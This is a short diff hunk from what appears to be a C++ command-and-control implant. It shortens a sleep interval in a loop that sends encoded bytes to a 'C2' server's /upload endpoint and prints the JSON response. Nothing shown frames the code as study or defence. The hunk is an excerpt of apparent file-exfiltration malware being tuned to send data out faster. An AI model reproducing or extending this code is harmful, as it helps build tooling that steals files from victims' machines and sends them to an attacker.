@@ -140,7 +140,7 @@ int main() {
                 std::wstring FileUploadURL = C2 + L"/upload";
                 std::string FilerResponse = SendData(L"POST", FileUploadURL, L"", EncodedBytes, L"");
                 std::cout << "JSON response for /upload: " << FilerResponse << std::endl;
-                Sleep(10000);
+                Sleep(5000);
             }
             
 
